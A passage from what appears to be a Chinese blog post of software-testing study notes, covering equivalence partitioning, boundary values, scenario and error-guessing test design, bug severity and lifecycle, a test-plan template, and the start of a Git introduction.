<h3 id="等价类划分法"><a href="#等价类划分法" class="headerlink" title="等价类划分法"></a>等价类划分法</h3><h4 id="定义及概念"><a href="#定义及概念" class="headerlink" title="定义及概念"></a>定义及概念</h4><p>​    把所有程序的<strong>输入域</strong>划分成若干个<strong>子合集（等价类）</strong>，然后从每一个子集合（等价类）中选取<strong>少数具有代表性</strong>的数据作为测试的输入数据。</p>
<ul>
<li><p>在该子集合中，所有的<strong>输入数据</strong>对于揭露软件中的错误都是等效的。  （保证质量、减少测试用例数量，提高效率）</p>
</li>
<li><p>等价类划分<strong>有效等价类（正面，不会报错</strong>）和<strong>无效等价类（负面，抛出错误）</strong></p>
</li>
</ul>
<p><strong>【举例】：</strong> 微信红包，需求：金额区间——0.01～200</p>
<p><strong>分析：</strong></p>
<ul>
<li><strong>有效等价类：</strong> 1)【0.01， 200】 4) 数字   6) 小数点后不超过两位</li>
<li><strong>无效等价类：</strong> 2)  &gt;200   3) &lt;0.01 5) 非数字（中文、字母、字符）  7) 超过两位小数    8) 空值    9) 负数</li>
</ul>
<h4 id="用例设计步骤和原则"><a href="#用例设计步骤和原则" class="headerlink" title="用例设计步骤和原则"></a>用例设计步骤和原则</h4><ol>
<li>分析需求，确定有效等价类和无效等价类；</li>
<li>在确立了等价类之后，建立等价类表，列出所有划分出的等价类；</li>
<li>再从划分出的等价类中选择测试用例。<ul>
<li>设计一个新的测试用例数据，使其<strong>尽可能多地覆盖</strong>尚未被覆盖的<strong>有效等价类</strong>，重复这一步，直到所有的有效等价类都被覆盖为止； （减少测试用例数量，避免重复，提高效率）</li>
<li>设计一个新的测试用例数据， 使其<strong>仅覆盖一个</strong>尚未被覆盖的<strong>无效等价类</strong>，重复这一步，直到所有的无效等价类都被覆盖为止。（为了确定是哪一个因素触发错误，每一种错误都被正确处理）</li>
</ul>
</li>
</ol>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>当测试需要数据量过大，且数据操作可以分类时进行等价类划分。</p>
<ul>
<li>输入条件规定的取值范围或值的个数的情况（类似最小&lt;x&lt;最大，最小&lt;x，x&lt;最大），比如用户名长度、红包金额数值输入范围</li>
<li>在下拉列表包含多个选项的情况，比如城市下拉选项（第一个、最后一个、中间一个）</li>
<li>在规定了输入数据必须遵守的规则的情况下，可确立一个有效等价类（符合规则）和若干个无效等价类（从不同角度违反规则）</li>
</ul>
<h3 id="边界值分析法"><a href="#边界值分析法" class="headerlink" title="边界值分析法"></a>边界值分析法</h3><h4 id="定义及概念-1"><a href="#定义及概念-1" class="headerlink" title="定义及概念"></a>定义及概念</h4><p>​    是对等价类划分法的一个补充，边界值一般都是从等价类的边缘值去寻找。</p>
<p><strong>【举例】：</strong> 微信红包，需求：金额区间——0.01～200</p>
<p><strong>分析：</strong></p>
<ul>
<li><strong>边界值：</strong> 0.01、0.02； 199.99、 200   </li>
<li><strong>边界值：</strong> 200.01  ； 0  ； 0.009   </li>
</ul>
<h4 id="用例设计步骤和原则-1"><a href="#用例设计步骤和原则-1" class="headerlink" title="用例设计步骤和原则"></a>用例设计步骤和原则</h4><ul>
<li><p>确定边界：应当选取正好等于，刚刚大于或刚刚小于边界的值作为测试数据（范围相关：有效等价类或无效等价类的边界，两点法、四点法）</p>
</li>
<li><p>次边界值：IP地址（0～255）， 时间格式（0～23），2的幂值（256、1024、65535） ，需求没有明说，常识</p>
</li>
<li><p>特殊边界值： 0是一个特殊值，负数，空值，空格等</p>
</li>
</ul>
<h4 id="应用场景-1"><a href="#应用场景-1" class="headerlink" title="应用场景"></a>应用场景</h4><p>如果需求规定了取值范围或规定了取值的个数时，可利用边界值进行测试。</p>
<p>以上等价类划分法的应用场景同时也会设计边界值的分析，还包括以下：</p>
<ul>
<li>报表数据的第一行、最后一行、中间一行（边界值）</li>
<li>屏幕上光标在最左上、最右下位置（web页面边界）</li>
</ul>
<h3 id="场景法"><a href="#场景法" class="headerlink" title="场景法"></a>场景法</h3><h4 id="定义及概念-2"><a href="#定义及概念-2" class="headerlink" title="定义及概念"></a>定义及概念</h4><p>通过场景描述的业务流程（业务逻辑），也包括代码实现逻辑，设计用例来便利场景（路径），验证软件系统功能的正确性。</p>
<h4 id="场景法设计步骤"><a href="#场景法设计步骤" class="headerlink" title="场景法设计步骤"></a>场景法设计步骤</h4><ul>
<li><p>根据产品需求文档画出流程图 （需要测试自己画）</p>
<p>矩形： 步骤（操作）</p>
<p>方圆： 输入、输出结果</p>
<p>菱形： 判断条件（是、否）</p>
<p>箭头： 流向</p>
</li>
<li><p>遍历场景，提取测试用例</p>
<p>1） 覆盖正常路径 （判断选 Y )</p>
<p>2） 走每一个分支 （判断选 N）</p>
<p>3） 出错步骤重回主流程，建议多走一步正确的步骤</p>
</li>
</ul>
<p>⚠️ 场景法的重点是<strong>测试流程</strong>，因此每一个流程用一个测试用例验证即可，系统功能需要单组的针对测试。</p>
<p><strong>单个功能点测试 + 流程测试 = 充分测试</strong>， ➕ 等价类、边界值等细化测试</p>
<p><strong>【举例】：</strong>ATM 🏧 取钱</p>
<p><strong>分析：</strong></p>
<ul>
<li><strong>场景一：</strong> 插入合法银行卡、输入正确密码、输入正确且充足金额（ATM足够）—— 取到钱</li>
<li><strong>场景二：</strong> 插入不合法银行卡，提示错误 —— 退卡</li>
<li><strong>场景三：</strong> 插入合法银行卡，输入密码后取消 —— 退卡</li>
<li><strong>场景四：</strong> 插入合法银行卡，输入错误密码后不取消（不超过三次） —— 提示密码错误，重新输入密码</li>
<li>……</li>
</ul>
<h3 id="错误推测法（反推法）"><a href="#错误推测法（反推法）" class="headerlink" title="错误推测法（反推法）"></a>错误推测法（反推法）</h3><h4 id="定义及概念-3"><a href="#定义及概念-3" class="headerlink" title="定义及概念"></a>定义及概念</h4><p>是基于经验和直觉推测程序中所有可能存在的各种错误，从而有针对性的设计测试用例的方法。</p>
<p><strong>三要素：经验、知识、直觉</strong></p>
<h4 id="设计步骤（发散）"><a href="#设计步骤（发散）" class="headerlink" title="设计步骤（发散）"></a>设计步骤（发散）</h4><ul>
<li>考虑程序中可能触发错误场景（不能正常运行）</li>
<li>不单独使用（作为其他方法的补充）</li>
</ul>
<p><strong>【举例】：</strong> 某平台登录页面</p>
<p><strong>分析：</strong> 错误猜测法，列出可能导致结果出错的情况（登录失败）</p>
<ul>
<li>账号密码错误</li>
<li>验证码输入错误（图片、短信）</li>
<li>网络问题</li>
<li>浏览器兼容性</li>
<li>性能弱（并发大量用户）</li>
<li>账号黑名单（被举报）</li>
<li>错误次数过多（冻结账号）</li>
<li>服务器异常（无响应）</li>
<li>第三方登录问题</li>
<li> 单点登录（处理）</li>
</ul>
<h2 id="测试用例编写和评审"><a href="#测试用例编写和评审" class="headerlink" title="测试用例编写和评审"></a>测试用例编写和评审</h2><p>测试用例（TestCase）是为项目需求而编制的一组<strong>测试输入、 执行条件以及预期结果</strong>，以便测试某个程序是否满足客户需求。</p>
<p>可以总结为：<strong>每一个测试点的数据设计和步骤设计</strong></p>
<h3 id="测试用例的重要性"><a href="#测试用例的重要性" class="headerlink" title="测试用例的重要性"></a>测试用例的重要性</h3><ol>
<li><p>测试用例的软件测试的核心</p>
<p>测试用例的测试工作的指导，是软件测试质量稳定的根本保障。</p>
</li>
<li><p>评估测试结果的基准</p>
<p>测试用例的通过率以及错误率，是测试结束的一个重要依据，用来判断该软件测试结果是否通过，能否达到上限的标准。</p>
</li>
<li><p>保证测试的时候不遗漏测试功能点</p>
<p>可以在测试人员与悲的时候起到一个牵引作用</p>
</li>
<li><p>在编写测试用例的过程，可以熟悉需求，对系统架构或业务流程有一个整体的、深入的了解（深入测试，提bug）</p>
</li>
</ol>
<h3 id="测试用例的八大要素"><a href="#测试用例的八大要素" class="headerlink" title="测试用例的八大要素"></a>测试用例的八大要素</h3><ol>
<li><p><strong>用例编号</strong> ： 产品名 _ 测试阶段(it st uat) _ <strong>测试项 _ 编号xxx(英文)</strong></p>
<p>it: Integration Test, 集成测试                 st: System Test, 系统测试            uat:  User Acceptance Test, 用户接受测试</p>
</li>
<li><p><strong>测试项目</strong> ： 对应一个功能模块（细分功能）_ 子功能 </p>
</li>
<li><p><strong>测试标题</strong> ： 直接对<strong>测试点</strong>进行<strong>细化</strong>得出，<strong>输入内容 + 结果</strong>，同一功能模块标题不能重复（来自测试点） </p>
<p>建议一行一个测试点、细致、数量越多</p>
</li>
<li><p>重要级别 ： 高（核心功能）/ 中（次要-异常）/ 低（界面，不常用场景）—— high、medium、low —— P1，P2，P3，P4，P5 —— 冒烟测试（P1），回归测试（p1，P2） —— 测试策略</p>
</li>
<li><p>预置条件 ： 需要满足一些前提条件，否则用例无法执行（不必须）</p>
</li>
<li><p><strong>测试输入（数据）</strong> ： 需要加工的输入信息，根据具体情况来设计（结合步骤一定要有具体<strong>指导性意义</strong>）</p>
</li>
<li><p><strong>操作步骤</strong> ： 明确给出每个步骤的描述，执行人员可以根据该步骤完成执行工作</p>
</li>
<li><p><strong>预期结果</strong> ： 根据预期输出对比实际结果，来判断被测对象是否符合要求（唯一，不能出现“是否”/“或者”）</p>
</li>
<li><p>实际结果 ： Failed/Passed  </p>
</li>
<li><p>备注（Comments）： 没有执行（原因）或失败（bug编号）</p>
</li>
<li><p>版本号： 产品编号</p>
</li>
</ol>
<p>⚠️  9-10 测试执行时填写</p>
<h3 id="测试用例评审流程"><a href="#测试用例评审流程" class="headerlink" title="测试用例评审流程"></a>测试用例评审流程</h3><p><strong>评审目的</strong>：防止漏测、错测</p>
<h3 id="测试用例的变更"><a href="#测试用例的变更" class="headerlink" title="测试用例的变更"></a>测试用例的变更</h3><p>由于需求变更、对业务的不断深入了解和测试用例评审，测试用例时无法一次全部写好的，测试用例在完成之后需要不断修正。</p>
<p><strong>测试用例变更通常包括</strong>：</p>
<ul>
<li>需求变动</li>
<li>执行完成后的用例完善</li>
<li>评审后的用例修改</li>
</ul>
<p><strong>ps: 一定要记得备份！！！</strong> 如  v1.0 —— v1.1</p>
<h3 id="常见笔试面试题-3"><a href="#常见笔试面试题-3" class="headerlink" title="常见笔试面试题"></a>常见笔试面试题</h3><ol>
<li><p><strong>用例需要评审吗？紧急情况用例也需要评审吗？</strong></p>
<p>需要。紧急情况可以进行简单内部评审就行。</p>
</li>
<li><p><strong>如果被测项目很紧急，来不及写用例怎么办？</strong></p>
<p>列出测试点，补充测试用例。</p>
</li>
<li><p><strong>遇到隐性需求如何写用例（需求不明确）</strong></p>
<p>根据经验充分了解熟悉产品，参考成熟产品，并向产品进行确认需求。</p>
</li>
<li><p><strong>用例有没有优先级？如果一定要有优先级，依据什么确定？</strong></p>
<p>有，根据功能重要性进行优先级评级。</p>
</li>
<li><p><strong>如何编写测试用例？（以项目为基础将一个小模块用例设计，如手机号）</strong></p>
<p>数据长度、数据格式、是否合法（国内外、号段）、前缀</p>
</li>
</ol>
<h2 id="Bug的跟踪管理及禅道使用"><a href="#Bug的跟踪管理及禅道使用" class="headerlink" title="Bug的跟踪管理及禅道使用"></a>Bug的跟踪管理及禅道使用</h2><img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10.png" class>

<h3 id="Bug的定义及类型"><a href="#Bug的定义及类型" class="headerlink" title="Bug的定义及类型"></a>Bug的定义及类型</h3><ul>
<li><p>狭义概念是指<strong>软件程序的漏洞或缺陷</strong>；</p>
</li>
<li><p>广义概念除此之外还包括 <u>测试工程师</u> 或 <u>用户</u> 所发现和提出的软件<strong>可改进的细节（增强性、建议性）</strong>、<strong>或与需求文档存在差异的功能实现</strong>等。</p>
</li>
</ul>
<p>软件测试工程师的职责就是发现这些Bug并提交给开发修改。</p>
<p> 常见的<strong>Bug类型划分</strong>（禅道系统为例，可自定义）：</p>
<ul>
<li>代码（功能）错误：最常见、优先级偏高</li>
<li>界面优化： UI测试、优先级偏低</li>
<li>设计缺陷： 优化建议（需求上不合理）、优先级偏低 </li>
</ul>
<h3 id="Bug的等级（优先级）"><a href="#Bug的等级（优先级）" class="headerlink" title="Bug的等级（优先级）"></a>Bug的等级（优先级）</h3><p>Bug的等级划分有三四级也有五级，等级越高被修复的等级也会高一些。</p>
<p>一般可参照下面判断条件来判断Bug的等级（严重程度）：</p>
<p><strong>（1） 致命错误 —— blocker</strong></p>
<pre><code>1. **常规操作**引起的系统崩溃、死机、死循环、闪退
1. 造成数据泄漏的安全性问题，如恶意攻击造成的账户私密信息泄露
1. 涉及金钱**计算，如造成公司巨大损失，业务**
1. 阻断性测试，所有测试工作进行不下去（冒烟测试），如登录问题
1. 权限问题，如爱奇艺资源对应会员
</code></pre>
<p><strong>（2） 严重错误 —— critical</strong></p>
<ol>
<li>重要功能不能实现</li>
<li>错误的波及面广，影响到其他重要功能正常实现，如12306购票系统</li>
<li><strong>非常规操作</strong>导致的程序崩溃、死机、死循环、闪退</li>
<li>外观（界面）难以接受的缺陷</li>
<li>密码明文显示（前端处理bug，后端服务器/数据库验证）</li>
<li>偶现的致命性bug</li>
</ol>
<p><strong>（3） 一般错误 —— major</strong></p>
<p>不影响产品运行、不会成为故障起因，但对产品外观和下道工序影响较大的缺陷</p>
<ol>
<li>次要功能不能正常实现</li>
<li>操作界面错误（包括数据窗口内列名定义、含义不一致）</li>
<li>查询错误，数据错误显示</li>
<li>简单的输入限制未放在<strong>前端</strong>进行控制</li>
<li>删除操作未给出提示（友好型）</li>
<li>偶现的严重性bug</li>
</ol>
<p><strong>（4） 细微错误 —— minor</strong></p>
<p>程序在一些显示上不美观，不符合用户习惯，或一些文字错误（影响用户体验）</p>
<ol>
<li>界面不规范</li>
<li>辅助说明描述不清楚</li>
<li>提示窗口文字未采用行业术语</li>
<li>界面存在文字错误</li>
</ol>
<p><strong>（5） 改进建议 —— enhancement （新需求下一个版本）</strong></p>
<p>可以提高产品质量的建议，包括新需求和对需求的改进</p>
<p><strong>【练习】bug的类型及等级判断</strong></p>
<table>
<thead>
<tr>
<th align="left">bug描述</th>
<th align="left">等级判断</th>
</tr>
</thead>
<tbody><tr>
<td align="left">用户输入正确用户名和密码不能登录网站</td>
<td align="left">分产品：QQ-blocker、爱奇艺- critical/major</td>
</tr>
<tr>
<td align="left">客户需求要有充值功能，但网站没有做</td>
<td align="left">重要功能未实现：致命错误</td>
</tr>
<tr>
<td align="left">网站充值后出现金额错误</td>
<td align="left">分析理财类还是时间延迟</td>
</tr>
<tr>
<td align="left">某购物app上商品搜索时，闪退回手机桌面</td>
<td align="left">致命错误</td>
</tr>
<tr>
<td align="left">某购物app上商品搜索时，手机卡死</td>
<td align="left">致命错误</td>
</tr>
<tr>
<td align="left">关闭按钮在弹窗左侧</td>
<td align="left">细微错误</td>
</tr>
<tr>
<td align="left">app某个图标显示太小或像素失真</td>
<td align="left">一般/细微错误</td>
</tr>
<tr>
<td align="left">某个提示语需要改进，用户对专业术语不太懂</td>
<td align="left">细微错误</td>
</tr>
<tr>
<td align="left">忘记密码，功能未实现</td>
<td align="left">一般错误</td>
</tr>
</tbody></table>
<h3 id="Bug的生命周期-管理流程（重点）"><a href="#Bug的生命周期-管理流程（重点）" class="headerlink" title="Bug的生命周期/管理流程（重点）"></a>Bug的生命周期/管理流程（重点）</h3><p>bug的<strong>生命周期</strong>，<strong>就是一个bug被发现到这个bug被修复关闭的过程</strong>。</p>
<p>​    生命周期中一般缺陷状态：发现——<strong>新建(提bug)<strong>——指派——</strong>已解决</strong>——待验——<strong>关闭</strong>——正常</p>
<p>​    如果待验的bug在验证时没有解决好，需要 重新打开(激活)——指派——已解决——待验，循环这个过程。</p>
<p>​    中间其他状态：拒绝、延期等。</p>
<p>一个bug的处理流程图（生命周期图）如下：</p>
<img src="/2022/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/10/03/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/11.png" class>

<ul>
<li><p><strong>确认bug</strong>：防止环境问题、操作问题等外因（无效bug）</p>
</li>
<li><p><strong>提交bug</strong>：new(新建) 指派给开发，然后跟进（push开发修复）</p>
</li>
<li><p>**重复bug(duplicated)**：需要开发备注一下重复bug的ID号，然后反给测试确认</p>
<ul>
<li>如果重复则加备注然后关闭bug</li>
<li>如果不是则重新激活(reopened)后指派给开发</li>
</ul>
</li>
<li><p>**不是缺陷(invalid)**：分析原因 —— 设计如此、操作失误、需求理解不一致。若因对需求理解不同则与开发争论：</p>
<ul>
<li><p>从用户角度出发分析需求找到证据，尝试说服开发</p>
</li>
<li><p>然后向产品/项目经理确认是否bug</p>
<ul>
<li><p>若是，则开发修复</p>
</li>
<li><p>若不是，则测试书面确认（留存证据，邮件/文字截图，备注bug），关闭bug</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>**无法复现(un-reproduced)**：</p>
<ul>
<li>开发无法复现，则确认一下测试环境能否再复现<ul>
<li>如果可以，则帮助开发复现</li>
<li>或开发去测试环境调试定位</li>
</ul>
</li>
<li>测试和开发环境都无法复现，尝试跟踪3～5个版本（10次+），之后添加备注（复现次数、跟踪版本数），然后关闭bug，并记录下来方便后续研究  </li>
</ul>
</li>
<li><p>**不予解决(wontfix)**：bug级别过低（UI、minor、enhancement）</p>
<ul>
<li>首先还是尝试说服开发修复</li>
<li>之后再去找产品确认需求，若无需修复备注留证据，关闭bug</li>
</ul>
</li>
<li><p>**延期(delayed)**：</p>
<ul>
<li>建议性bug(feature/enhancement)：作为下一个版本需求</li>
<li>上线之前影响较大（性价比）<ul>
<li>分析bug对用户影响大小，建议开发修复</li>
<li>判断严重级别</li>
<li>跟产品/项目经理最后确认是否需要修复，若无需修复，备注并留存证据，不关闭bug（挂起）</li>
</ul>
</li>
</ul>
</li>
<li><p>已修复(resolved-fixed)：测试验证bug（重复bug步骤，检查结果）</p>
<ul>
<li>若验证通过(verified)，等到项目结束关闭bug</li>
<li>若仍然存在，重新激活(reopened)，指派给开发</li>
</ul>
</li>
</ul>
<h3 id="Bug的跟踪管理——缺陷管理工具"><a href="#Bug的跟踪管理——缺陷管理工具" class="headerlink" title="Bug的跟踪管理——缺陷管理工具"></a>Bug的跟踪管理——缺陷管理工具</h3><h4 id="常见的缺陷管理平台"><a href="#常见的缺陷管理平台" class="headerlink" title="常见的缺陷管理平台"></a>常见的缺陷管理平台</h4><p>**禅道(zentao)**：开源，国内用的比较多</p>
<p><strong>bugzilla、jira</strong>：都还不错，功能强大，支持bug和项目管理，支持中英文，但是搭建比较麻烦</p>
<p><strong>bugfree</strong></p>
<p>redmine</p>
<p>easybug：免费开源，在线网站类型</p>
<p>Mantis</p>
<p>QC(QualityCenter)、TD</p>
<h4 id="如何提交bug"><a href="#如何提交bug" class="headerlink" title="如何提交bug"></a>如何提交bug</h4><p>提交一个bug到管理平台，需包含以下内容：</p>
<ul>
<li><p><strong>bug标题</strong> ： <strong>简洁清晰，写明bug描述</strong>，如没有选择功能模块，最好在标题中备注功能模块， 方便查看人员清楚知道表达的意思。</p>
<p>​                    <strong>bug功能模块 + bug操作 + bug结果</strong></p>
</li>
<li><p><strong>重现步骤</strong> ： 详细写下发现bug的测试过程。<strong>能指导开发重现bug</strong>，附上<strong>测试数据</strong>。</p>
</li>
<li><p><strong>实际结果</strong> ： 出现bug的结果，<strong>粘贴bug截图、日志截图</strong>（直观、证据）</p>
</li>
<li><p><strong>预期结果</strong> ： 写<strong>清楚预期</strong>（<strong>来自于测试用例的预期结果</strong>）</p>
</li>
<li><p>bug类型和严重程度 ： 便于后续测试结果分析，bug统计</p>
</li>
<li><p>bug测试环境 ： 例如系统名称和版本、<strong>兼容性问题、难以重现问题</strong></p>
</li>
<li><p>附件 ： 日志文件、文件<strong>测试数据</strong>，图片、崩溃日志文件等</p>
</li>
</ul>
<p>所以以上，参考公司前辈写的bug，依葫芦画瓢，拓展测试思维</p>
<h3 id="常见面试笔试题"><a href="#常见面试笔试题" class="headerlink" title="常见面试笔试题"></a>常见面试笔试题</h3><ol>
<li><p><strong>有没有令你印象深刻的bug？bug的原因/bug当时怎么解决的？</strong></p>
<p>==待定。==</p>
</li>
<li><p><strong>bug的生命周期？</strong></p>
<p>发现——<strong>新建(提bug)<strong>——指派——</strong>已解决</strong>——待验——<strong>关闭</strong>——正常。</p>
<p>如果验证未通过，需要循环以下过程： 重新打开(激活)——指派——已解决——待验。</p>
</li>
<li><p><strong>当你开了一个bug，但是开发不认为是bug，如何处理？</strong></p>
<ul>
<li><p>找到需求并整理证据，与开发理论，说服开发；</p>
</li>
<li><p>若开发不认同，去找产品确认需求</p>
<ul>
<li>若确定bug，找开发修复</li>
<li>若不是bug，留存证据并备注好，关闭bug</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>你在发现bug并确认bug的过程中，对于复现率不高的bug怎么处理？</strong></p>
<p>尝试跟踪3～5个版本进行bug复现（每个版本复现10+次），如果仍然无法复现，给bug添加备注（复现次数、跟踪版本数）然后关闭bug。（可以记录下该bug后续继续研究跟进）</p>
</li>
</ol>
<h2 id="测试计划及模版"><a href="#测试计划及模版" class="headerlink" title="测试计划及模版"></a>测试计划及模版</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>一般是主管来写，测试计划是在做完需求分析后，整个测试工作开始之前做的一些准备计划工作，一般包括以下内容： “5W+1H”</p>
<ul>
<li><strong>目的 Why</strong></li>
<li><strong>测试范围 What</strong></li>
<li><strong>测试进度安排 When</strong></li>
<li><strong>测试人员 Who</strong></li>
<li><strong>测试环境 Where</strong></li>
<li><strong>测试方法+工具 How</strong></li>
<li><strong>风险评估</strong></li>
</ul>
<h3 id="测试计划模版"><a href="#测试计划模版" class="headerlink" title="测试计划模版"></a>测试计划模版</h3><h4 id="1-简介-——-Why"><a href="#1-简介-——-Why" class="headerlink" title="1 简介 —— Why"></a>1 简介 —— Why</h4><p>项目经理：管理项目的人</p>
<p>业务负责人： 产品</p>
<p>技术负责人：开发老大</p>
<p>测试负责人：测试老大</p>
<h4 id="2-测试范围-——-What"><a href="#2-测试范围-——-What" class="headerlink" title="2 测试范围 —— What"></a>2 测试范围 —— What</h4><p>参考需求文档列出重点测试范围（不等同于测试用例）</p>
<table>
<thead>
<tr>
<th>产品</th>
<th>模块</th>
<th>子模块</th>
<th>功能</th>
<th>测试点（可能没有）</th>
<th>优先级</th>
<th>负责人</th>
</tr>
</thead>
<tbody><tr>
<td>微信</td>
<td>登录</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>对应开发</td>
</tr>
</tbody></table>
<p>测试先后顺序及优先级都需要罗列出来，挨个验证。</p>
<ul>
<li>功能测试、非功能测试（界面、易用性、兼容性、性能、安全）</li>
</ul>
<h4 id="3-测试策略"><a href="#3-测试策略" class="headerlink" title="3 测试策略"></a>3 测试策略</h4><ul>
<li><p>测试轮次安排：冒烟测试（<strong>案例</strong>来自用例重要级别优先级选出） —— 第一轮系统测试 —— 第二轮 …（2～4轮）</p>
</li>
<li><p>用例组织（表明用例怎么来，为什么这样执行）</p>
</li>
</ul>
<h4 id="4-测试进度-——-When"><a href="#4-测试进度-——-When" class="headerlink" title="4 测试进度 —— When"></a>4 测试进度 —— When</h4><table>
<thead>
<tr>
<th align="center">测试阶段</th>
<th>测试活动</th>
<th>计划开始时间</th>
<th>计划结束时间</th>
<th align="center">交付产品</th>
</tr>
</thead>
<tbody><tr>
<td align="center">测试计划</td>
<td>熟悉需求和设计</td>
<td></td>
<td></td>
<td align="center">/</td>
</tr>
<tr>
<td align="center"></td>
<td>编写计划</td>
<td>20200418</td>
<td>20200418</td>
<td align="center">《XXX需求_ST测试计划》</td>
</tr>
<tr>
<td align="center">测试准备</td>
<td>需求及用例设计</td>
<td>20200420</td>
<td>20200421</td>
<td align="center">《XXX需求_测试案例》</td>
</tr>
<tr>
<td align="center"></td>
<td>用例评审</td>
<td>20200422</td>
<td>20200422</td>
<td align="center">《XXX需求_测试案例》</td>
</tr>
<tr>
<td align="center"></td>
<td>搭建环境/验证</td>
<td>20200423</td>
<td>20200423</td>
<td align="center">/</td>
</tr>
<tr>
<td align="center">测试执行</td>
<td>冒烟测试</td>
<td>20200423</td>
<td>20200424</td>
<td align="center">/</td>
</tr>
<tr>
<td align="center"></td>
<td>第一轮执行</td>
<td>20200424</td>
<td>20200428</td>
<td align="center">Bug（执行结果的用例）</td>
</tr>
<tr>
<td align="center"></td>
<td>第二轮执行</td>
<td>20200429</td>
<td>20200431</td>
<td align="center">Bug（执行结果的用例）</td>
</tr>
<tr>
<td align="center">测试总结</td>
<td>测试报告编写</td>
<td>20200501</td>
<td>20200501</td>
<td align="center">《XXX需求_ST测试报告》</td>
</tr>
</tbody></table>
<p>项目所需工作量：测试设计工作量、测试执行和测试总结工作量的总和，以人月或人日计。</p>
<p><strong>软件测试工作量应为开发工作量的30%～40%</strong></p>
<h4 id="5-测试资源-——-Who-Where"><a href="#5-测试资源-——-Who-Where" class="headerlink" title="5 测试资源 —— Who + Where"></a>5 测试资源 —— Who + Where</h4><p>人力资源 （任务分配）：</p>
<table>
<thead>
<tr>
<th>角色</th>
<th>人员</th>
<th>工作内容</th>
<th>起止时间</th>
<th>预计工作量（人天）</th>
</tr>
</thead>
<tbody><tr>
<td>测试主管</td>
<td>Tom</td>
<td>如：熟悉需求 、确认测试范围</td>
<td></td>
<td></td>
</tr>
<tr>
<td>测试主管</td>
<td>Tom</td>
<td>如：编写测试计划</td>
<td></td>
<td>1人/天</td>
</tr>
<tr>
<td>测试组</td>
<td>Jerry <br>小明<br>李华</td>
<td>编写测试用例：<br>A：注册登录 <br>B：聊天</td>
<td></td>
<td>3人/天</td>
</tr>
<tr>
<td></td>
<td></td>
<td>用例评审</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>测试环境：</p>
<table>
<thead>
<tr>
<th>需求名称</th>
<th>详细要求</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Windows 10、8.1、7</td>
</tr>
<tr>
<td>运行环境</td>
<td></td>
</tr>
<tr>
<td>Web浏览器</td>
<td>Chrome Firefox</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
</tbody></table>
<ol>
<li><p>甲方爸爸需求项目：按甲方爸爸要求准备测试环境</p>
</li>
<li><p>自主研发项目（产品+老板）：开发和产品沟通（测试环境）</p>
<p>原则：尽可能要跟客户环境保持一致</p>
</li>
</ol>
<p>硬件环境： 服务器（运维准备）</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>配置</th>
</tr>
</thead>
<tbody><tr>
<td>基础配置</td>
<td>CPU：</td>
</tr>
<tr>
<td></td>
<td>内存：</td>
</tr>
<tr>
<td></td>
<td>硬盘：</td>
</tr>
</tbody></table>
<h4 id="6-测试风险管理"><a href="#6-测试风险管理" class="headerlink" title="6 测试风险管理"></a>6 测试风险管理</h4><p>根据软件产品实际情况，填写测试风险列表，分析本软件测试过程中可能出现的风险并采取相应的措施。</p>
<p>【举例】</p>
<ol>
<li>人员调岗或离职：备份（调配人员）</li>
<li>需求变更：时间预留，管理人员规划流程</li>
<li>问题太多，bug太多，阻塞测试：时间预留、安排，与开发/产品商量（开发担责）</li>
</ol>
<p>测试主管：保证项目按时按质量发布，主要是 <strong>人员 + 时间</strong> 的调配，申请延期发布。</p>
<h2 id="版本管理工具-Git"><a href="#版本管理工具-Git" class="headerlink" title="版本管理工具 Git"></a>版本管理工具 Git</h2><p><strong>版本控制</strong>（Revision control）：用于在软件开发的过程中管理我们对代码、文件等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本。简单说就是用于管理多人协同开发项目。</p>
<p>可以把一个版本控制系统理解为”数据库”，在需要的时候，它可以帮你快速保存一个项目的快照，当你需要查看上一个版本时（即快照），版本控制系统可以显示出当前版本与上一个版本之间所改动的细节。</p>
<h3 id="Git的基本概念"><a href="#Git的基本概念" class="headerlink" title="Git的基本概念"></a>Git的基本概念</h3><ul>
<li><p><strong>Git</strong>：是一个开源的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。</p>
</li>
<li><p><strong>GitHub</strong>：全球最大的面向开源及私有软件项目的托管平台，免费注册并可以免费托管开源代码。</p>
</li>
<li><p><strong>GitLab</strong>：与GitHub类似，也是属于第三方基于Git开发的产品，不同的是GitLab可以部署在自己的服务器上，代码数据都是掌握在自己手中，适合公司内部团队开发。</p>
</li>
</ul>
<h3 id="Git-和-SVN-的区别"><a href="#Git-和-SVN-的区别" class="headerlink" title="Git 和 SVN 的区别"></a>Git 和 SVN 的区别</h3><ul>
<li>SVN (Subversion) 版本集中管理，所有的代码都在一台服务器上；分支和主线是不一样的URL地址路径。</li>
<li>Git 分布式管理，去中心化，服务器和每个开发人员都拥有一个本地的代码管理仓库；分支和主线路径是一样的。</li>
</ul>
<p><strong>注意：本地仓库 ， 远程仓库。</strong></p>
<p><strong>总结 Git 比 SVN 更强大，目前大部分公司在用。</strong></p>
<h3 id="如何使用-Git"><a href="#如何使用-Git" class="headerlink" title="如何使用 Git"></a>如何使用 Git</h3><ol>
<li><p><strong>安装工具</strong></p>
<ul>
<li><strong>git</strong>  命令行模式（像Linux命令）</li>
<li><strong>tortoiseGit</strong> 图形化界面操作</li>
</ul>
</li>
<li><p><strong>公司服务器（多个仓库，一般一个项目对应一个仓库），针对不同的人账号有不同权限！</strong></p>
<p>​    首先需要一个git账号，公司的所有文件或代码都放到git仓库中（仓库地址），需要有账号才能克隆相应分支下来，得到所有的文件或代码；</p>
<p>​    然后也可以吧本地推送到远程仓库中（账号有权限）。</p>
</li>
<li><p><strong>分支（Branch）和主线（Master）</strong></p>
<ul>
<li><strong>主线（Master）</strong>：主树干，一般放稳定代码（最终的代码）</li>
